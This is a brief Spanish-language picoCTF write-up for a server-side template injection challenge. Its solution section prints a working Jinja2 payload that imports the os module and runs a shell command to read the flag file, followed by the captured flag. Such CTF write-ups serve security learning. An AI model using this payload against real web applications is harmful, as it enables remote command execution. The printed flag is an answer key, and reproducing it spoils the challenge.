## Descripción 
I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:65299/)!

Hint:
1. Server Side Template Injection
## Solución 1

Ingresamos a la página dada e ingresamos valores y son incorrectos, en la pista nos dice que son las SSTI y las buscamos. Esto significa que servidor no filtra correctamente lo que los usuarios ingresan permitiendo inyectar código, simplemente buscamos una inyección de código que funcione para encontrar la bandera.

```
Inyección de código ingresada en la página:
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

flag: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_424a1494}
```

## Referencias
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/